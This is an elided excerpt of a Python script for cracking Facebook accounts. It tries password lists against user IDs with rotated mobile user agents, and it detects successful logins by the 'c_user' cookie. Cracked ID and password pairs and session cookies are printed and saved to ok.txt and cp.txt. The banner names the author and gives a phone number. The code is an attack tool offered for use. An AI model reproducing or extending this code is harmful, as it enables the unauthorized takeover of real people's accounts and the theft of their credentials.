...
\033[1;93m--------------------------------------------------
\033[1;31m [+] GITHUB         : NOT AVAILABLE 
\033[1;37m [+] Author           : ASIF SAKHANI 
\033[1;34m [+] FACEBOOK   : MR DEVIL 
\033[1;33m [+] phone            : 03417930930
\033[1;35m [+] Version        : 2.1
...
def mcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[ASIF-OK] '+cid+' | '+ps+'\33[0;97m')
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[ASIF-CP] '+cid+' | '+ps+'\33[0;97m')
...
def mbcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			session = requests.Session()
			sys.stdout.write(f'\r \x1b[1;92m[ASIF] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
			pro = random.choice(agents)
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;32m[ASIF-OK] '+cid+' | '+ps+'\033[1;32m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;33m[ASIF-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
